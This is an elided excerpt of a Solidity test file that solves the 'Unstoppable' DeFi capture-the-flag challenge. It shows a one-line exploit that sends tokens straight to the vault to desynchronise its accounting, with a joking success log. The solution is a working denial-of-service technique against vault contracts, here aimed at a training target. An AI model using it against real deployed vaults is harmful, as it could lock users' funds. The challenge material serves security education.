...
contract UnstoppableChallenge is Test {
    ...
    function test_unstoppable() public checkSolvedByPlayer {
        ...
        token.transfer(address(vault), INITIAL_PLAYER_TOKEN_BALANCE); // well that was easy. we just have to desync state accounting.
    }
    ...
    function _isSolved() private {
        ...
        console.log("EASY PEEZY!!! C'MON TINCHO YOU CAN DO BETTER ;-)");
    }
}
